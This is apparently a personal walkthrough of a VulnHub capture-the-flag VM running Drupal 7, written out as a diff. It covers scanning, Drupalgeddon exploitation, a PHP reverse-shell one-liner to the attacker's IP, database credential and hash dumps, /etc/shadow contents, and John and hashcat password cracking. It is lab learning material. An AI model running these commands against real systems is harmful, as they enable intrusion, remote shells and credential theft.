@@ -1,0 +1,397 @@
+ATTACKER MACHINE
+--------------------------------------------------------------------------------------
+HOST
+                             nugroho@nugroho-HP
+                             OS: Zorin 15 bionic
+                             Kernel: x86_64 Linux 5.3.0-46-generic
+         #####               Uptime: 14h 44m
+        #######              Packages: Unknown
+        ##O#O##              Shell: zsh 5.4.2
+        #######              Resolution: 1920x1080
+      ###########            DE: GNOME 
+     #############           WM: GNOME Shell
+    ###############          WM Theme: ZorinBlue-Dark
+    ################         GTK Theme: ZorinBlue-Dark [GTK2/3]
+   #################         Icon Theme: oxygen
+ #####################       Font: Inter 10
+ #####################       CPU: Intel Core i7-8550U @ 8x 4GHz
+   #################         GPU: Mesa DRI Intel(R) UHD Graphics 620 (Kabylake GT2) 
+                             RAM: 4064MiB / 15763MiB
+                            
+                            
+---------------------------------------------------------------------------------------
+VM via SSH
+..............                                  
+            ..,;:ccc,.                           nugroho@hekerendonesa
+          ......''';lxO.                         OS: Kali Linux 
+.....''''..........,:ld;                         Kernel: x86_64 Linux 5.5.0-kali1-amd64
+           .';;;:::;,,.x,                        Uptime: 9h 1m
+      ..'''.            0Xxoc:,.  ...            Packages: 3341
+  ....                ,ONkc;,;cokOdc',.          Shell: bash 5.0.16
+ .                   OMo           ':ddo.        Disk: 28G / 82G (36%)
+                    dMc               :OO;       CPU: Intel Core i7-8550U @ 4x 1.992GHz
+                    0M.                 .:o.     GPU: VMware SVGA II Adapter
+                    ;Wd                          RAM: 780MiB / 1963MiB
+                     ;XO,                       
+                       ,d0Odlc;,..              
+                           ..',;:cdOOd::,.      
+                                    .:d;.':;.   
+                                       'd,  .'  
+                                         ;l   ..
+                                          .o    
+                                            c   
+                                            .'  
+                                             .  
+
+
+
+-------------------------------------------------------------------------------------
+
+# Intialized with initHTB by no0g
+---------------------------------------------------------------
+lin.htb = 172.16.203.134
+
+
+Open Ports
+------------------
+PORT   STATE SERVICE
+80/tcp open  http
+
+----------------------------------------------------------------
+
+ Intense Scan Port 80
+
+----------------------------------------------------------------
+# Nmap 7.80 scan initiated Thu Apr 23 09:00:24 2020 as: nmap -A -p80 -oN intense.txt 172.16.203.134
+Nmap scan report for lin.htb (172.16.203.134)
+Host is up (0.0014s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+|_http-generator: Drupal 7 (http://drupal.org)
+| http-robots.txt: 36 disallowed entries (15 shown)
+| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
+| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
+| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
+|_/LICENSE.txt /MAINTAINERS.txt
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: Welcome to La fraude fiscale des grandes soci\xC3\xA9t\xC3\xA9s | La fraud...
+MAC Address: 00:0C:29:09:F2:C9 (VMware)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   1.43 ms lin.htb (172.16.203.134)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu Apr 23 09:00:33 2020 -- 1 IP address (1 host up) scanned in 9.09 seconds
+
+----------------------------------------------------------------
+
+/robots.txt
+
+#
+# robots.txt
+#
+# This file is to prevent the crawling and indexing of certain parts
+# of your site by web crawlers and spiders run by sites like Yahoo!
+# and Google. By telling these "robots" where not to go on your site,
+# you save bandwidth and server resources.
+#
+# This file will be ignored unless it is at the root of your host:
+# Used:    http://example.com/robots.txt
+# Ignored: http://example.com/site/robots.txt
+#
+# For more information about the robots.txt standard, see:
+# http://www.robotstxt.org/robotstxt.html
+#
+# For syntax checking, see:
+# http://www.frobee.com/robots-txt-check
+
+User-agent: *
+Crawl-delay: 10
+# Directories
+Disallow: /includes/
+Disallow: /misc/
+Disallow: /modules/
+Disallow: /profiles/
+Disallow: /scripts/
+Disallow: /themes/
+# Files
+Disallow: /CHANGELOG.txt
+Disallow: /cron.php
+Disallow: /INSTALL.mysql.txt
+Disallow: /INSTALL.pgsql.txt
+Disallow: /INSTALL.sqlite.txt
+Disallow: /install.php
+Disallow: /INSTALL.txt
+Disallow: /LICENSE.txt
+Disallow: /MAINTAINERS.txt
+Disallow: /update.php
+Disallow: /UPGRADE.txt
+Disallow: /xmlrpc.php
+# Paths (clean URLs)
+Disallow: /admin/
+Disallow: /comment/reply/
+Disallow: /filter/tips/
+Disallow: /node/add/
+Disallow: /search/
+Disallow: /user/register/
+Disallow: /user/password/
+Disallow: /user/login/
+Disallow: /user/logout/
+# Paths (no clean URLs)
+Disallow: /?q=admin/
+Disallow: /?q=comment/reply/
+Disallow: /?q=filter/tips/
+Disallow: /?q=node/add/
+Disallow: /?q=search/
+Disallow: /?q=user/password/
+Disallow: /?q=user/register/
+Disallow: /?q=user/login/
+Disallow: /?q=user/logout/
+
+-----------------------------------------------------------------------------------------------------------------------------------
+searchsploit "drupal 7"
+------------------------------------------------------------------------------------------ ----------------------------------------
+ Exploit Title                                                                            |  Path
+                                                                                          | (/usr/share/exploitdb/)
+------------------------------------------------------------------------------------------ ----------------------------------------
+Drupal 4.7 - 'Attachment mod_mime' Remote Command Execution                               | exploits/php/webapps/1821.php
+Drupal 4.x - URL-Encoded Input HTML Injection                                             | exploits/php/webapps/27020.txt
+Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Add Admin User)                         | exploits/php/webapps/34992.py
+Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Admin Session)                          | exploits/php/webapps/44355.php
+Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (1)               | exploits/php/webapps/34984.py
+Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (2)               | exploits/php/webapps/34993.php
+Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Remote Code Execution)                  | exploits/php/webapps/35150.php
+Drupal 7.12 - Multiple Vulnerabilities                                                    | exploits/php/webapps/18564.txt
+Drupal 7.x Module Services - Remote Code Execution                                        | exploits/php/webapps/41564.php
+Drupal < 4.7.6 - Post Comments Remote Command Execution                                   | exploits/php/webapps/3313.pl
+Drupal < 5.22/6.16 - Multiple Vulnerabilities                                             | exploits/php/webapps/33706.txt
+Drupal < 7.34 - Denial of Service                                                         | exploits/php/dos/35415.txt
+Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                  | exploits/php/webapps/44557.rb
+Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)               | exploits/php/webapps/44542.txt
+Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution       | exploits/php/webapps/44449.rb
+Drupal Module CKEditor < 4.1WYSIWYG (Drupal 6.x/7.x) - Persistent Cross-Site Scripting    | exploits/php/webapps/25493.txt
+Drupal Module Coder < 7.x-1.3/7.x-2.6 - Remote Code Execution                             | exploits/php/remote/40144.php
+Drupal Module Cumulus 5.x-1.1/6.x-1.4 - 'tagcloud' Cross-Site Scripting                   | exploits/php/webapps/35397.txt
+Drupal Module Drag & Drop Gallery 6.x-1.5 - 'upload.php' Arbitrary File Upload            | exploits/php/webapps/37453.php
+Drupal Module Embedded Media Field/Media 6.x : Video Flotsam/Media: Audio Flotsam - Multi | exploits/php/webapps/35072.txt
+Drupal Module RESTWS 7.x - PHP Remote Code Execution (Metasploit)                         | exploits/php/remote/40130.rb
+Drupal avatar_uploader v7.x-1.0-beta8 - Arbitrary File Disclosure                         | exploits/php/webapps/44501.txt
+------------------------------------------------------------------------------------------ ----------------------------------------
+
+vuln to CVE-2014-3704: Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Remote Code Execution) 
+
+----------------------------------------------------------------------------------------------------------------------------------
+ww-data shell
+stabilizing shell
+
+PHP reverse_shell:
+php -r '$sock=fsockopen("172.16.203.1",9001);exec("/bin/sh -i <&3 >&3 2>&3");'           
+
+Spawn tty shell:
+1. python -c "import pty;pty.spawn('/bin/bash')"
+2. ctrl+z
+3. stty raw -echo
+4. fg
+5. export TERM=xterm
+-----------------------------------------------------------------------------------------------------------------------------------
+Finding MySQL Creds
+
+/var/www/html/sites/default/settings.php
+
+mysql cred: 
+uname: drupaluser
+password:nimda
+databasename : drupal
+
+users table
+
++-------------+---------------------------------------------------------+------------------------+
+| name        | pass                                                    | mail                   |
++-------------+---------------------------------------------------------+------------------------+
+|             |                                                         |                        |
+| drupaladmin | $S$Ds5SgCrqwrbxJY36HldOHA3C9wWH0W3DXMkHSXBb7SsYVfhhlM7s | drupal@knight139.co.uk |
+| fApgMhwkXE  | $S$DbkIdE4PcEgPggp1/R4EPmwEbcOpjdGRrr/XXbIZDtrM9Jr2O5EV | febsw@oghoe.hjk        |
+| CCraMrjfJG  | $S$D0kgV6a3Rz81QnFojJjDn2/yuQihgv6GV3RroocAiMsQsFemL8Bd | bgtfa@gifzr.sxh        |
+| MgZvEnuAmR  | $S$DDqF1e6heeGb2KRGBN.7/jSELCy8/a9K1R.KGTCcb3JZMAqDgKQh | lvkzl@gzxkk.uab        |
+| EWiQXdUOKg  | $S$DJ0sJsJ4HiU5UFKOS4PBGxFSFdzpBVnt2vwQ2okOmPsw/OBTLDhR | asbzl@ovigs.itw        |
++-------------+---------------------------------------------------------+------------------------+
+-
+--------------------------------------------------------------------------------------------------
+Going to Root
+python linuxprivchecker.py
+
+[*] FINDING RELEVENT PRIVILEGE ESCALATION EXPLOITS...
+
+    Note: Exploits relying on a compile/scripting language not detected on this system are marked with a '**' but should still be tested!
+
+    The following exploits are ranked higher in probability of success because this script detected a related running process, OS, or mounted file system
+    - MySQL 4.x/5.0 User-Defined Function Local Privilege Escalation Exploit || http://www.exploit-db.com/exploits/1518 || Language=c
+
+    The following exploits are applicable to this kernel version and should be investigated as well
+    - Kernel ia32syscall Emulation Privilege Escalation || http://www.exploit-db.com/exploits/15023 || Language=c
+    - Sendpage Local Privilege Escalation || http://www.exploit-db.com/exploits/19933 || Language=ruby
+    - CAP_SYS_ADMIN to Root Exploit 2 (32 and 64-bit) || http://www.exploit-db.com/exploits/15944 || Language=c
+    - CAP_SYS_ADMIN to root Exploit || http://www.exploit-db.com/exploits/15916 || Language=c
+    - MySQL 4.x/5.0 User-Defined Function Local Privilege Escalation Exploit || http://www.exploit-db.com/exploits/1518 || Language=c
+    - open-time Capability file_ns_capable() Privilege Escalation || http://www.exploit-db.com/exploits/25450 || Language=c
+    - open-time Capability file_ns_capable() - Privilege Escalation Vulnerability || http://www.exploit-db.com/exploits/25307 || Language=c
+
+
+-------------------------------------------------------------------------------------------------
+Kernel ver: 3.13.0-43-generic
+
+vuln to CVE-2015-1328 Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation https://www.exploit-db.com/exploits/37292
+
+-------------------------------------------------------------------------------------------------
+Password Cracking
+/etc/passwd
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+libuuid:x:100:101::/var/lib/libuuid:
+syslog:x:101:104::/home/syslog:/bin/false
+messagebus:x:102:105::/var/run/dbus:/bin/false
+gsuser:x:1000:1000:Generic User,,,:/home/gsuser:/bin/bash
+sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
+mysql:x:105:112:MySQL Server,,,:/nonexistent:/bin/false
+
+/etc/shadow
+
+root:$6$fSUKb/ov$EFE6LjrVpz2yJrd2QSQEe/mGQ.8q3xXi9s5CJL95ngeh95PS91e10XLav4gRE1z4jv1Wmb6WH24yVQA6GKwEl/:16415:0:99999:7:::
+daemon:*:16415:0:99999:7:::
+bin:*:16415:0:99999:7:::
+sys:*:16415:0:99999:7:::
+sync:*:16415:0:99999:7:::
+games:*:16415:0:99999:7:::
+man:*:16415:0:99999:7:::
+lp:*:16415:0:99999:7:::
+mail:*:16415:0:99999:7:::
+news:*:16415:0:99999:7:::
+uucp:*:16415:0:99999:7:::
+proxy:*:16415:0:99999:7:::
+www-data:*:16415:0:99999:7:::
+backup:*:16415:0:99999:7:::
+list:*:16415:0:99999:7:::
+irc:*:16415:0:99999:7:::
+gnats:*:16415:0:99999:7:::
+nobody:*:16415:0:99999:7:::
+libuuid:!:16415:0:99999:7:::
+syslog:*:16415:0:99999:7:::
+messagebus:*:16415:0:99999:7:::
+puppet:*:16415:0:99999:7:::
+gsuser:$6$4onuSzBI$X19Aq0XXMti44iNSno3omOTq.fCPo342mPfprBQMMuXENvX1kt975gI1tkmR4h574GyBZRpfECmciaVWKISuT0:16415:0:99999:7:::
+sshd:*:16415:0:99999:7:::
+mysql:!:16415:0:99999:7:::
+
+hash
+
+root:$6$fSUKb/ov$EFE6LjrVpz2yJrd2QSQEe/mGQ.8q3xXi9s5CJL95ngeh95PS91e10XLav4gRE1z4jv1Wmb6WH24yVQA6GKwEl/:0:0:root:/root:/bin/bash
+daemon:*:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:*:2:2:bin:/bin:/usr/sbin/nologin
+sys:*:3:3:sys:/dev:/usr/sbin/nologin
+sync:*:4:65534:sync:/bin:/bin/sync
+games:*:5:60:games:/usr/games:/usr/sbin/nologin
+man:*:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:*:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:*:8:8:mail:/var/mail:/usr/sbin/nologin
+news:*:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:*:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:*:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:*:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:*:34:34:backup:/var/backups:/usr/sbin/nologin
+list:*:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:*:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:*:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:*:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+libuuid:!:100:101::/var/lib/libuuid:
+syslog:*:101:104::/home/syslog:/bin/false
+messagebus:*:102:105::/var/run/dbus:/bin/false
+gsuser:$6$4onuSzBI$X19Aq0XXMti44iNSno3omOTq.fCPo342mPfprBQMMuXENvX1kt975gI1tkmR4h574GyBZRpfECmciaVWKISuT0:1000:1000:Generic User,,,:/home/gsuser:/bin/bash
+sshd:*:104:65534::/var/run/sshd:/usr/sbin/nologin
+mysql:!:105:112:MySQL Server,,,:/nonexistent:/bin/false
+
+
+$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
+
+$ john --show hash
+root:toor:0:0:root:/root:/bin/bash
+
+1 password hash cracked, 1 left
+
+
+
+--------------------------------------------------------------------------------------------------
+root:toor
+-------------------------------------------------------------------------------------------------
+Cracking .tc File password
+
+$ hashcat -m 6221 -a 0 dave.tc /usr/share/wordlists/rockyou.txt --force
+cracked password for .tc file
+
+dave.tc:etonacademy                              
+                                                 
+Session..........: hashcat
+Status...........: Cracked
+Hash.Type........: TrueCrypt PBKDF2-HMAC-SHA512 + XTS 512 bit
+Hash.Target......: dave.tc
+Time.Started.....: Thu Apr 23 12:06:08 2020 (43 mins, 41 secs)
+Time.Estimated...: Thu Apr 23 12:49:49 2020 (0 secs)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:     2927 H/s (8.88ms) @ Accel:128 Loops:124 Thr:1 Vec:4
+Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
+Progress.........: 8247019/14344385 (57.49%)
+Rejected.........: 235/8247019 (0.00%)
+Restore.Point....: 8246507/14344385 (57.49%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:992-999
+Candidates.#1....: etrovias.99 -> etodc
+
+Started: Thu Apr 23 12:06:02 2020
+Stopped: Thu Apr 23 12:49:50 2020
+
+-----------------------------------------------------------------------------------------------
+
+----------------------------------------------------------------------------------------------
+truecrypt dave.tc
+
+/.secret/.top/
+cat flag.txt
+
+
+################################################################################
+#   ___ ___  _  _  ___ ___    _ _____ _   _ _      _ _____ ___ ___  _  _  ___  #
+#  / __/ _ \| \| |/ __| _ \  /_\_   _| | | | |    /_\_   _|_ _/ _ \| \| |/ __| #
+# | (_| (_) | .` | (_ |   / / _ \| | | |_| | |__ / _ \| |  | | (_) | .` |\__ \ #
+#  \___\___/|_|\_|\___|_|_\/_/ \_\_|  \___/|____/_/ \_\_| |___\___/|_|\_||___/ #
+#                                                                              #
+################################################################################
+
+Firstly, thanks for trying this VM. If you have rooted it, well done!
+
+Shout-outs go to #vulnhub for hosting a great learning tool. A special thanks
+goes to barrebas and junken for help in testing and final configuration.
+                                                                    --knightmare
